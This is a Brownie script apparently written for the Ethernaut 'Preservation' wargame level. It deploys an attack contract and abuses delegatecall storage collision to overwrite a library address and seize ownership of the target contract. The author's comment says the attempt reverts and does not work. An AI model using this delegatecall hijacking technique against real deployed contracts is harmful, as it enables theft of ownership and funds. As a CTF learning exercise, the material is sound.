from brownie import Preservation, Contract, LibraryContract, Attack
from scripts.helpful_scripts import *
from web3 import Web3

account = getAccount()
preserve = Contract.from_abi(
    "Preservation", "0x37318258F79Bd0275AAd1714ca4119732c1a0F0D", Preservation.abi
)


def main():
    attack = Attack.deploy({"from": account})
    tx = preserve.setFirstTime(attack.address, {"from": account})
    tx.wait(1)
    print(preserve.timeZone1Library())
    tx2 = attack.setTime(1)
    tx2.wait(1)
    print(preserve.owner())

    # This doesn't work. From the two solutions I've looked up, they both use this exact method to
    # complete the level. From what I've gathered, when I call preserve.setFirstTime with parameter of
    # malicous contract's address, that address should be implicitly converted to a uint (as setFirstTime
    # takes a uint as an argument), then that uint is used as the argument for setTime() in LibraryContract
    # That LibraryContract should then set timeZone1Library to that uint which implicitly converts back to
    # Attacker's address. When running this code, the delegateCall to LibraryContract.setTime reverts so
    # I would have to assume the conversions are not working how I think they should be.
    # I've tried explicitly converting the Attacker's address to a uint before passing it as an argument
    # to no avail.

    # URLs to those solutions mentioned
    # https://www.youtube.com/watch?v=ILcJfJ8XHPQ
    # https://medium.com/coinmonks/ethernaut-lvl-16-preservation-walkthrough-how-to-inject-malicious-contracts-with-delegatecall-81e071f98a12
